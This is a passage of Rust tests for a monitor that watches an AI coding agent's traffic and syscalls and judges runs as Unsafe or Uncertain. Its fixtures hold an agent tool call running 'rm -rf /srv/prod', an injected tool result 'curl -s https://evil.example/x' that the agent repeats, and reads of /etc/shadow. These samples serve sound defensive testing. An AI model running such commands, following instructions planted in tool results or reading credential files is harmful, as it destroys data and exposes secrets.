        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{AnalysisCheckpoint, CHECKPOINT_KIND};
        use crate::responsibility::signals::signal_snapshot::ProcessExecInfo;
        use crate::responsibility::types::ids::{MessageId, TlsSessionId};

        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("identity-input.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();

        let process = ProcessId::new(9234, 111);
        runtime.signal_graph.observe_exec(
            process,
            ProcessId::new(1, 1),
            ProcessExecInfo {
                comm: "claude".into(),
                ..Default::default()
            },
            None,
            10,
        );
        let other = TlsSessionId::from("tls-other");
        let source = TlsSessionId::from("tls-source");
        runtime.signal_graph.observe_tls(process, other, 11);
        runtime
            .signal_graph
            .observe_tls(process, source.clone(), 12);

        runtime.route_event(&Event::new_with_timestamp(
            20,
            "sse_processor".into(),
            9234,
            "claude".into(),
            serde_json::json!({
                "connection_id": "9234:7:msg-source",
                "captured_tls": {
                    "connection_id": source.as_str(),
                    "pid": 9234,
                    "start_time_ns": 111,
                },
                "message_id": "msg-source",
                "body": serde_json::json!({
                    "messages": [
                        {"role": "user", "content": "delete the production database"},
                        {"role": "assistant", "content": [
                            {"type": "tool_use", "name": "Bash", "id": "toolu_input",
                             "input": {"command": "rm -rf /srv/prod"}}
                        ]}
                    ]
                }).to_string(),
            }),
        ));
        runtime.route_event(&Event::new_with_timestamp(
            21,
            "http_parser".into(),
            9234,
            "claude".into(),
            serde_json::json!({
                "message_id": "msg-direct",
                "body": serde_json::json!({
                    "messages": [
                        {"role": "user", "content": "list the working directory"},
                        {"role": "assistant", "content": [
                            {"type": "tool_use", "name": "Bash", "id": "toolu_direct",
                             "input": {"command": "pwd"}}
                        ]}
                    ]
                }).to_string(),
            }),
        ));

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();

        let connection = rusqlite::Connection::open(&db_path).unwrap();
        let binding_type = |message_id: &str| -> String {
            connection
                .query_row(
                    "SELECT binding_type FROM message_bindings WHERE message_id = ?1",
                    [message_id],
                    |row| row.get(0),
                )
                .unwrap()
        };
        assert_eq!(binding_type("msg-source"), "TlsShared");
        assert_eq!(
            binding_type("msg-direct"),
            "DirectProcess",
            "a connection-less message is persisted as a direct process binding"
        );

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("finalize persists the checkpoint");
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload.clone()).unwrap();

        let input = checkpoint
            .identity_input
            .as_ref()
            .expect("new checkpoints freeze the PRE-resolver input");
        assert_eq!(input.schema, RAW_IDENTITY_INPUT_SCHEMA);
        let frozen_policy = checkpoint
            .identity_policy
            .as_ref()
            .expect("new checkpoints freeze the active comm boundary");
        assert_eq!(frozen_policy.schema, IDENTITY_BOUNDARY_POLICY_SCHEMA);
        assert!(frozen_policy.matches_comm("claude"));
        assert!(
            !payload["identity_policy"].to_string().contains("agent_id"),
            "the frozen policy must not embed resolved identities"
        );
        let message = MessageId::from("msg-source");
        assert!(
            input
                .tls_messages
                .iter()
                .any(|row| row.tls_session_id == source && row.message_ids.contains(&message)),
            "the DTO must name the captured source connection"
        );
        assert!(
            !input
                .tls_messages
                .iter()
                .any(|row| row.tls_session_id.as_str() == "tls-other"),
            "the DTO must not attach the message to another TLS session"
        );
        assert!(
            input
                .direct_process_messages
                .iter()
                .any(|row| row.message_ids.contains(&MessageId::from("msg-direct"))),
            "the connection-less message stays a direct process fact"
        );
        assert!(
            !payload["identity_input"].to_string().contains("agent_id"),
            "the frozen input must not embed resolved identities"
        );
        let graph_inputs = checkpoint
            .graph_inputs
            .as_ref()
            .expect("new checkpoints freeze the PRE-resolver graph context");
        assert_eq!(
            graph_inputs.version,
            crate::responsibility::replay::checkpoint::FROZEN_GRAPH_INPUTS_VERSION
        );
        assert!(
            graph_inputs
                .task_envelopes
                .iter()
                .all(|row| checkpoint
                    .intents
                    .iter()
                    .any(|intent| intent.intent_id == row.intent_id
                        && intent.tool_name == "UserPrompt")),
            "every frozen task envelope must anchor a UserPrompt intent"
        );
        assert!(
            graph_inputs.provenance.iter().all(|row| checkpoint
                .intents
                .iter()
                .any(|intent| intent.intent_id == row.intent_id)),
            "every frozen provenance row must anchor a recorded intent"
        );
        assert!(
            !payload["graph_inputs"].to_string().contains("agent_id"),
            "the frozen graph context must not embed an authoritative actor"
        );

        let agent = checkpoint
            .identities
            .iter()
            .find(|agent| agent.process_ids.contains(&process))
            .expect("TLS plus messages produce an authoritative agent");
        assert!(
            agent.message_ids.contains(&message),
            "authoritative message_ids must not stay empty"
        );
        assert!(agent.tls_sessions.contains(&source));
    }

    #[tokio::test]
    async fn finalize_persists_message_supported_logical_identity_without_shared_pid() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{AnalysisCheckpoint, CHECKPOINT_KIND};
        use crate::responsibility::signals::signal_snapshot::ProcessExecInfo;
        use crate::responsibility::types::identity_types::AgentConfidence;
        use crate::responsibility::types::ids::{MessageId, TlsSessionId};

        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("logical-identity.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let process = ProcessId::new(9240, 222);
        runtime.signal_graph.observe_exec(
            process,
            ProcessId::new(1, 1),
            ProcessExecInfo {
                comm: "claude".into(),
                ..Default::default()
            },
            None,
            10,
        );
        runtime
            .signal_graph
            .observe_tls(process, TlsSessionId::from("tls-logical"), 11);

        for (message, conversation) in [("msg-a", "conv-a"), ("msg-b", "conv-b")] {
            let body = serde_json::json!({
                "conversation_id": conversation,
                "messages": [
                    {"role": "user", "content": "run the build"},
                    {"role": "assistant", "content": [
                        {"type": "tool_use", "name": "Bash", "id": format!("toolu-{message}"),
                         "input": {"command": "make"}}
                    ]}
                ]
            })
            .to_string();
            runtime.route_event(&Event::new_with_timestamp(
                20,
                "http_parser".into(),
                9240,
                "claude".into(),
                serde_json::json!({
                    "message_type": "request",
                    "message_id": message,
                    "body": body,
                }),
            ));
        }

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("finalize persists the checkpoint");
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        let input = checkpoint.identity_input.as_ref().expect("frozen input");
        assert_eq!(
            input.message_conversations.len(),
            2,
            "both request-declared anchors reach the frozen checkpoint"
        );

        let logical: Vec<_> = checkpoint
            .identities
            .iter()
            .filter(|identity| identity.process_ids.is_empty())
            .collect();
        assert_eq!(
            logical.len(),
            2,
            "one logical identity per anchored session"
        );
        for identity in &logical {
            assert!(identity.tls_sessions.is_empty());
            assert!(identity.provisional_refs.is_empty());
            assert!(matches!(identity.confidence, AgentConfidence::Inferred));
            assert_eq!(identity.message_ids.len(), 1);
            assert!(
                identity.message_ids.iter().all(|message| {
                    *message == MessageId::from("msg-a") || *message == MessageId::from("msg-b")
                }),
                "a logical identity owns only its anchored message"
            );
        }
        assert!(
            checkpoint
                .identities
                .iter()
                .all(|identity| !identity.process_ids.contains(&process)),
            "the shared process is never written as a logical identity owner"
        );

        let connection = rusqlite::Connection::open(&db_path).unwrap();
        for identity in &logical {
            let (pids, messages, confidence): (String, String, String) = connection
                .query_row(
                    "SELECT process_ids_json, message_ids_json, confidence \
                     FROM agent_identities WHERE agent_id = ?1 AND run_id = ?2",
                    rusqlite::params![identity.agent_id.as_str(), &run_id],
                    |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)),
                )
                .expect("the logical identity is persisted");
            assert_eq!(pids, "[]");
            assert_ne!(messages, "[]");
            assert_eq!(confidence, "Inferred");
            let mappings: i64 = connection
                .query_row(
                    "SELECT count(*) FROM identity_process_map WHERE agent_id = ?1",
                    [identity.agent_id.as_str()],
                    |row| row.get(0),
                )
                .unwrap();
            assert_eq!(
                mappings, 0,
                "a message-only logical identity must not claim the shared PID"
            );
        }
    }

    /// A classified action whose process has no agent ancestry must reach
    /// SQLite, the frozen checkpoint and the per-unit identity cohort. It is
    /// retained before gating but never gets a fabricated streaming actor.
    #[tokio::test]
    async fn finalize_retains_unknown_action_in_cohort_and_full_view() {
        use crate::responsibility::identity::view::{
            IdentityCondition, IdentityUnitKind, UnitActor,
        };
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{
            AnalysisCheckpoint, CHECKPOINT_KIND, identity_view_for_checkpoint,
        };
        use crate::responsibility::signals::signal_snapshot::ProcessExecInfo;

        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("unknown-action.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let process = ProcessId::new(9241, 222);
        runtime.signal_graph.observe_exec(
            process,
            ProcessId::new(1, 1),
            ProcessExecInfo {
                comm: "curl".into(),
                ..Default::default()
            },
            None,
            10,
        );
        runtime.route_event(&Event::new(
            "process".into(),
            9241,
            "curl".into(),
            json!({
                "event": "FILE_OPEN",
                "filepath": "/tmp/unknown-before-identity",
                "flags": 0,
                "start_time_ns": 222,
                "outcome": "succeeded",
                "syscall_ret": 3,
            }),
        ));
        assert_eq!(
            runtime.graph_buffer.actions.len(),
            1,
            "the raw action is retained before identity gating"
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let persisted = reader.get_actions(&run_id).unwrap();
        assert_eq!(persisted.len(), 1, "the raw action reaches SQLite once");
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("finalize persists the checkpoint");
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        assert_eq!(
            checkpoint.actions.len(),
            1,
            "an unknown action must not disappear from the frozen checkpoint"
        );
        let analysis = &checkpoint.capture_quality["analysis"];
        assert_eq!(analysis["raw_actions_retained_before_identity"], true);
        assert_eq!(
            analysis["actions_dropped_no_agent_semantics"],
            "streaming_correlation_skipped"
        );

        let view = identity_view_for_checkpoint(&checkpoint, IdentityCondition::Full).unwrap();
        let action = view
            .units
            .iter()
            .find(|unit| unit.kind == IdentityUnitKind::Action)
            .expect("the unknown action remains in the shared cohort");
        assert!(
            matches!(action.actor, UnitActor::Unknown { .. }),
            "no agent may be fabricated for an unknown action: {:?}",
            action.actor
        );
        assert!(action.actor.partition().is_none());
    }

    /// The retained action can recover ancestry from a later real EXEC signal:
    /// the final view resolves it, while no earlier actor was invented.
    #[tokio::test]
    async fn late_exec_ancestry_resolves_retained_action_at_final_view() {
        use crate::responsibility::identity::view::{
            IdentityCondition, IdentityUnitKind, UnitActor,
        };
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{
            AnalysisCheckpoint, CHECKPOINT_KIND, identity_view_for_checkpoint,
        };
        use crate::responsibility::types::NormalizedArg;
        use crate::responsibility::types::ids::TlsSessionId;

        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("late-ancestry.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        runtime.route_event(&Event::new(
            "process".into(),
            9242,
            "curl".into(),
            json!({
                "event": "FILE_OPEN",
                "filepath": "/tmp/late-ancestry",
                "flags": 0,
                "start_time_ns": 222,
                "outcome": "succeeded",
                "syscall_ret": 3,
            }),
        ));
        assert_eq!(runtime.graph_buffer.actions.len(), 1);
        assert!(
            runtime
                .identity_resolver
                .agent_for_process(ProcessId::new(9242, 222))
                .is_none(),
            "no actor exists before the EXEC signal arrives"
        );

        let exec = |pid: u32, start: u64, ppid: u64, parent_start: u64, comm: &str| {
            Event::new(
                "process".into(),
                pid,
                comm.into(),
                json!({
                    "event": "EXEC", "pid": pid, "start_time_ns": start,
                    "ppid": ppid, "parent_start_time_ns": parent_start, "comm": comm,
                }),
            )
        };
        runtime.route_event(&exec(9242, 222, 5002, 111, "curl"));
        runtime.route_event(&exec(5002, 111, 1, 1, "claude"));
        // The positive identity signal also arrives after the raw action.
        runtime.signal_graph.observe_tls(
            ProcessId::new(5002, 111),
            TlsSessionId::from("tls-late"),
            30,
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();

        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (_, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("finalize persists the checkpoint");
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        let open = checkpoint
            .actions
            .iter()
            .find(|action| {
                action.normalized_args.iter().any(
                    |arg| matches!(arg, NormalizedArg::Path(path) if path == "/tmp/late-ancestry"),
                )
            })
            .expect("the retained FILE_OPEN action is still in the checkpoint");
        let view = identity_view_for_checkpoint(&checkpoint, IdentityCondition::Full).unwrap();
        let action = view
            .units
            .iter()
            .find(|unit| {
                unit.kind == IdentityUnitKind::Action
                    && unit.unit_id.ends_with(open.action_id.as_str())
            })
            .expect("the retained action stays in the cohort");
        assert!(
            matches!(action.actor, UnitActor::Assigned { .. }),
            "a later real EXEC signal resolves ancestry: {:?}",
            action.actor
        );
    }

    #[tokio::test]
    async fn finalization_records_replayable_analysis_and_unknown_capture_quality() {
        use crate::responsibility::persistence::PersistenceReader;
        use crate::responsibility::replay::checkpoint::{
            AnalysisCheckpoint, CHECKPOINT_KIND, CHECKPOINT_VERSION,
        };
        let directory = tempfile::tempdir().unwrap();
        let db_path = directory.path().join("checkpoint.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();
        runtime.last_baseline_deviation = Some(0.72);
        runtime.finalize().await;
        runtime.persistence.flush().await.unwrap();
        let reader = PersistenceReader::open(&db_path.to_string_lossy()).unwrap();
        let (version, payload) = reader
            .get_analysis_checkpoint(&run_id, CHECKPOINT_KIND)
            .unwrap()
            .expect("live finalization must persist its complete analysis input");
        assert_eq!(version, CHECKPOINT_VERSION);
        let checkpoint: AnalysisCheckpoint = serde_json::from_value(payload).unwrap();
        checkpoint.validate(&run_id).unwrap();
        let context = &checkpoint.capture_quality["recording_context"];
        assert_eq!(context["schema"], "mtagentlens.collector-context/v1");
        assert_eq!(context["start"]["pid"], std::process::id());
        assert_eq!(context["finish"]["pid"], std::process::id());
        assert_eq!(
            context["start"]["procfs_start_ticks"],
            context["finish"]["procfs_start_ticks"]
        );
        assert!(context["start"]["boot_id"].is_string());
        let strict = runtime.provenance.is_strict();
        let analysis = &checkpoint.capture_quality["analysis"];
        assert_eq!(
            analysis["provenance_policy"],
            if strict {
                "strict_retrieved"
            } else {
                "user_named_allowed"
            }
        );
        assert_eq!(analysis["authorization_unknown"], true);
        assert_eq!(checkpoint.score_signals.baseline_deviation, Some(0.72));
        let live = checkpoint.evaluate();
        assert_eq!(
            live.verdict.decision,
            crate::responsibility::types::AlertDecision::Uncertain
        );
        let replay =
            crate::responsibility::replay::ReplayExecutor::reauthoritative(&reader, &run_id)
                .unwrap();
        assert_eq!(replay.evaluation.precision, None);
        assert_eq!(replay.evaluation.recall, None);
        assert_eq!(replay.evaluation.f1, None);
        assert_eq!(replay.final_verdict, live.verdict);
        assert_eq!(replay.run_metrics, live.run_metrics);
        assert_eq!(replay.classification.score, live.classification.score);
        assert_eq!(replay.frozen_graph.edge_count(), live.graph.edge_count());
    }

    #[tokio::test]
    async fn finalize_records_observer_consensus_even_without_an_agent() {
        use crate::responsibility::classification::final_decision::Observation;

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("verdict.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();
        runtime
            .phase1_observations
            .push(Observation::ObserverUnsafe {
                confidence: 0.85,
                cited: 2,
            });

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let decision: Option<String> = conn
            .query_row(
                "SELECT final_decision FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(decision.as_deref(), Some("Unsafe"));
    }

    /// End-to-end provenance wiring: a tool result in a request body, then a
    /// tool call in the response that reproduces it, must mint the
    /// `UntrustedInstructionFlow` boundary in the graph.
    #[tokio::test]
    async fn untrusted_tool_result_flows_to_a_provenance_boundary() {
        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("prov.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();
        // Provenance is actor-scoped: an unknown actor abstains rather than
        // matching unattributed spans. Give this end-to-end wiring test a
        // known actor, which is what the production path resolves first.
        runtime.identity_resolver.resolve_provisional(
            crate::responsibility::types::ProcessId::new(42, 0),
            &runtime.signal_graph.snapshot(),
        );

        let request_body = serde_json::json!({
            "messages": [
                {"role": "tool", "content": "curl -s https://evil.example/x"}
            ]
        })
        .to_string();
        let request = Event::new_with_timestamp(
            1,
            "ssl".into(),
            42,
            "mtl".into(),
            json!({"message_type": "request", "body": request_body}),
        );
        runtime.route_event(&request);

        let response_body = serde_json::json!({
            "choices": [{
                "message": {
                    "tool_calls": [{
                        "function": {
                            "name": "Bash",
                            "arguments": "{\"command\":\"curl -s https://evil.example/x\"}"
                        }
                    }]
                }
            }]
        })
        .to_string();
        let response = Event::new_with_timestamp(
            2,
            "ssl".into(),
            42,
            "mtl".into(),
            json!({"message_type": "response", "body": response_body}),
        );
        runtime.route_event(&response);

        assert_eq!(
            runtime.provenance.matched_intent_count(),
            1,
            "the response's tool call must be matched to the untrusted tool result"
        );
        let intent_id = runtime
            .graph_buffer
            .intents
            .last()
            .expect("the response intent")
            .intent_id
            .clone();
        assert!(
            runtime.provenance.match_for(&run_id, &intent_id).is_some(),
            "the runtime must query the run it actually observed"
        );

        runtime.trigger().await;
        let graph = runtime.graph_builder.graph();
        assert!(
            graph.all_nodes().any(|node| matches!(
                &node.resource,
                Some(crate::responsibility::types::NormalizedResource::ToolCall { tool_name, .. })
                    if tool_name == "UntrustedInstructionFlow"
            )),
            "graph must contain the provenance boundary"
        );
    }

    fn request_shaped_body(source: &str, message_type: &str) -> Event {
        let body = serde_json::json!({
            "messages": [
                {"role": "tool", "content": "curl -s https://evil.example/x"}
            ],
            "metadata": {"session_id": "sess-spoof-12345678"}
        })
        .to_string();
        Event::new_with_timestamp(
            1,
            source.into(),
            42,
            "mtl".into(),
            json!({
                "message_type": message_type,
                "body": body,
                // A payload-side claim must not turn a non-TLS producer into
                // an actual capture source.
                "original_source": "ssl",
            }),
        )
    }

    /// Only the canonical TLS converters supply captured request facts. A
    /// stdio/out-of-band event whose bytes look like a POST request must not
    /// register provenance spans or a conversation hint.
    #[tokio::test]
    async fn non_tls_sources_cannot_spoof_captured_request_facts() {
        for source in ["outofband", "stdio"] {
            let dir = tempfile::tempdir().unwrap();
            let mut runtime = runtime_with_db(&dir.path().join("spoof.db"));
            runtime.init_session();
            runtime.identity_resolver.resolve_provisional(
                crate::responsibility::types::ProcessId::new(42, 0),
                &runtime.signal_graph.snapshot(),
            );

            runtime.route_event(&request_shaped_body(source, "request"));

            assert_eq!(
                runtime.provenance.span_count(),
                0,
                "{source} must not register a captured request span"
            );
            assert!(
                !runtime
                    .signal_graph
                    .snapshot()
                    .conversation_ids()
                    .any(|id| id == "sess-spoof-12345678"),
                "{source} must not register a conversation hint"
            );
        }
    }

    #[tokio::test]
    async fn captured_tls_request_registers_provenance_and_conversation() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("tls-request.db"));
        runtime.init_session();
        runtime.identity_resolver.resolve_provisional(
            crate::responsibility::types::ProcessId::new(42, 0),
            &runtime.signal_graph.snapshot(),
        );

        runtime.route_event(&request_shaped_body("ssl", "request"));

        assert!(
            runtime.provenance.span_count() > 0,
            "an actual TLS request must register the tool-result span"
        );
        assert!(
            runtime
                .signal_graph
                .snapshot()
                .conversation_ids()
                .any(|id| id == "sess-spoof-12345678"),
            "an actual TLS request must register its conversation hint"
        );
    }

    #[tokio::test]
    async fn captured_tls_response_does_not_register_request_provenance() {
        let dir = tempfile::tempdir().unwrap();
        let mut runtime = runtime_with_db(&dir.path().join("tls-response.db"));
        runtime.init_session();
        runtime.identity_resolver.resolve_provisional(
            crate::responsibility::types::ProcessId::new(42, 0),
            &runtime.signal_graph.snapshot(),
        );

        runtime.route_event(&request_shaped_body("ssl", "response"));

        assert_eq!(
            runtime.provenance.span_count(),
            0,
            "a response is not a captured request"
        );
        assert!(
            !runtime
                .signal_graph
                .snapshot()
                .conversation_ids()
                .any(|id| id == "sess-spoof-12345678"),
            "a response must not register the request's conversation hint"
        );
    }

    /// A confirmed shadow read is hard evidence: the finalize pass must
    /// produce `Unsafe` without any Observer call.
    #[tokio::test]
    async fn finalize_turns_a_shadow_read_into_unsafe() {
        use crate::responsibility::identity::resolver::IdentityProvider;
        use crate::responsibility::types::{
            AgentId, IntentId, IntentParseState, MessageId, NormalizedArg, ProcessId,
            evidence_types::{Intent, IntentAuthoritySource, IntentClass},
        };

        struct OneAgent;
        impl IdentityProvider for OneAgent {
            fn agent_for_process(&self, _: ProcessId) -> Option<AgentId> {
                Some(AgentId::from("agent-a"))
            }
            fn all_assignments(&self) -> std::collections::HashMap<ProcessId, AgentId> {
                std::collections::HashMap::new()
            }
        }

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("shadow.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();

        let pid = ProcessId::new(4242, 7);
        let intent = Intent {
            intent_id: IntentId::new(),
            process_id: pid,
            message_id: MessageId::new(),
            tool_name: "Read".into(),
            tool_args: vec![NormalizedArg::Path("/etc/shadow".into())],
            intent_class: IntentClass::SideEffect,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::HttpResponseToolUse,
            timestamp_ns: 1_000,
            native_tool_call: None,
            declared_conversation_id: None,
        };
        let delta = runtime
            .graph_builder
            .handle_intent_pbc(&intent, &OneAgent)
            .expect("shadow path must produce a boundary candidate");
        assert!(!delta.new_edges.is_empty());

        // Naming the path is a candidate. It becomes hard evidence only when
        // an observed action is correlated with that intent — this is the
        // step that used to be missing from the decision model.
        use crate::responsibility::types::{
            Action, ActionCandidateType, ActionId, CandidateDerivationMode, CorrelationEvidence,
            EvidenceId, MatchLevel, PhaseIndicator, SignalClass, evidence_types::NormalizedArgs,
        };
        let action = Action {
            outcome: crate::responsibility::types::ActionOutcome::Succeeded,
            syscall_ret: Some(0),
            syscall_name: None,
            action_id: ActionId::new(),
            process_id: pid,
            action_type: ActionCandidateType::FileRead,
            normalized_args: vec![NormalizedArg::Path("/etc/shadow".into())],
            derivation_mode: CandidateDerivationMode::Direct,
            signal_class: SignalClass::HighSignal,
            timestamp_ns: 2_000,
        };
        let evidence = CorrelationEvidence {
            evidence_id: EvidenceId::new(),
            intent_id: intent.intent_id.clone(),
            action_id: action.action_id.clone(),
            match_level: MatchLevel::L1Exact,
            confidence: 0.9,
            matched_fields: NormalizedArgs {
                canonical_path: Some("/etc/shadow".into()),
                host: None,
                port: None,
                command: None,
                raw_args: vec!["/etc/shadow".into()],
            },
            derivation_mode: CandidateDerivationMode::Direct,
            phase: PhaseIndicator::Authoritative {
                timestamp_ns: 2_000,
                overrides: None,
            },
            timestamp_ns: 2_000,
        };
        let delta = runtime
            .graph_builder
            .handle(&evidence, &intent, &action, &OneAgent);
        assert!(
            delta.new_edges.iter().any(|edge| edge.edge_type
                == crate::responsibility::types::ResponsibilityEdgeType::PolicyBoundaryCrossing
                && !edge.evidence_refs.is_empty()),
            "the observed read must upgrade the candidate to an evidenced crossing"
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let decision: Option<String> = conn
            .query_row(
                "SELECT final_decision FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(decision.as_deref(), Some("Unsafe"));
        let provenance: String = conn
            .query_row(
                "SELECT decision_provenance_json FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert!(
            provenance.contains("hard_violation"),
            "hard evidence must be named in the provenance: {provenance}"
        );
    }

    /// An intent that only *names* a secret is a review candidate, not a
    /// verdict: no syscall was observed, so the run must not be Unsafe.
    #[tokio::test]
    async fn finalize_keeps_an_intent_only_shadow_candidate_in_review() {
        use crate::responsibility::identity::resolver::IdentityProvider;
        use crate::responsibility::types::{
            AgentId, IntentId, IntentParseState, MessageId, NormalizedArg, ProcessId,
            evidence_types::{Intent, IntentAuthoritySource, IntentClass},
        };

        struct OneAgent;
        impl IdentityProvider for OneAgent {
            fn agent_for_process(&self, _: ProcessId) -> Option<AgentId> {
                Some(AgentId::from("agent-a"))
            }
            fn all_assignments(&self) -> std::collections::HashMap<ProcessId, AgentId> {
                std::collections::HashMap::new()
            }
        }

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("candidate.db");
        let mut runtime = runtime_with_db(&db_path);
        let run_id = runtime.init_session();
        let intent = Intent {
            intent_id: IntentId::new(),
            process_id: ProcessId::new(5151, 9),
            message_id: MessageId::new(),
            tool_name: "Read".into(),
            tool_args: vec![NormalizedArg::Path("/etc/shadow".into())],
            intent_class: IntentClass::SideEffect,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::HttpResponseToolUse,
            timestamp_ns: 1_000,
            native_tool_call: None,
            declared_conversation_id: None,
        };
        runtime
            .graph_builder
            .handle_intent_pbc(&intent, &OneAgent)
            .expect("candidate");

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");

        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let decision: Option<String> = conn
            .query_row(
                "SELECT final_decision FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(decision.as_deref(), Some("Uncertain"));
    }

    /// A public account database creates no candidate; absent capture diagnostics still require review.
    #[tokio::test]
    async fn finalize_keeps_passwd_benign_and_unknown_capture_explicit() {
        use crate::responsibility::identity::resolver::IdentityProvider;
        use crate::responsibility::types::{
            AgentId, IntentId, IntentParseState, MessageId, NormalizedArg, ProcessId,
            evidence_types::{Intent, IntentAuthoritySource, IntentClass},
        };

        struct OneAgent;
        impl IdentityProvider for OneAgent {
            fn agent_for_process(&self, _: ProcessId) -> Option<AgentId> {
                Some(AgentId::from("agent-a"))
            }
            fn all_assignments(&self) -> std::collections::HashMap<ProcessId, AgentId> {
                std::collections::HashMap::new()
            }
        }

        let dir = tempfile::tempdir().unwrap();
        let db_path = dir.path().join("passwd.db");
        let mut runtime = runtime_with_db(&db_path);
        runtime.config.disable_observer = true;
        let run_id = runtime.init_session();
        let intent = Intent {
            intent_id: IntentId::new(),
            process_id: ProcessId::new(1, 1),
            message_id: MessageId::new(),
            tool_name: "Read".into(),
            tool_args: vec![NormalizedArg::Path("/etc/passwd".into())],
            intent_class: IntentClass::SideEffect,
            parse_state: IntentParseState::Complete,
            primary_matching_eligible: true,
            authority_source: IntentAuthoritySource::HttpResponseToolUse,
            timestamp_ns: 1_000,
            native_tool_call: None,
            declared_conversation_id: None,
        };
        assert!(
            runtime
                .graph_builder
                .handle_intent_pbc(&intent, &OneAgent)
                .is_none(),
            "a world-readable account database is not a policy boundary"
        );

        runtime.finalize().await;
        runtime.persistence.flush().await.expect("flush");
        let conn = crate::responsibility::persistence::schema::open_responsibility_db_read_only(
            &db_path.to_string_lossy(),
        )
        .expect("open");
        let decision: Option<String> = conn
            .query_row(
                "SELECT final_decision FROM runs WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("query");
        assert_eq!(decision.as_deref(), Some("Uncertain"));

        let metrics_rows: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM analysis_checkpoints \
                 WHERE run_id = ?1 AND checkpoint_kind = 'run-metrics'",
                [&run_id],
                |row| row.get(0),
            )
            .expect("count run-metrics rows");
        assert_eq!(metrics_rows, 1, "finalization must persist one metrics row");
        let claim_rows: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM responsibility_claims WHERE run_id = ?1",
                [&run_id],
                |row| row.get(0),
            )
            .expect("count claims");
        assert_eq!(claim_rows, 0, "this finalization is the zero-claim case");

        let reader =
            crate::responsibility::persistence::PersistenceReader::open(&db_path.to_string_lossy())
                .expect("open reader");
        let (version, metrics) = reader
            .get_analysis_checkpoint(
                &run_id,
                crate::responsibility::replay::run_metrics::RUN_METRICS_KIND,
            )
            .expect("query run-metrics")
            .expect("zero-claim finalization must still persist real metrics");
        assert_eq!(
            version,
            crate::responsibility::replay::run_metrics::RUN_METRICS_VERSION
        );
        assert_eq!(metrics["schema_version"], 1);
        assert_eq!(metrics["run_id"].as_str(), Some(run_id.as_str()));
        assert_eq!(
            metrics["score_source"],
            "authoritative_classification_triage/1"
        );
        assert_eq!(metrics["final_decision"], "Uncertain");
        let (_, frozen) = reader
            .get_analysis_checkpoint(
                &run_id,
                crate::responsibility::replay::checkpoint::CHECKPOINT_KIND,
            )
            .expect("query frozen capture quality")
            .expect("finalization persists its capture snapshot");
        let recorded_quality =
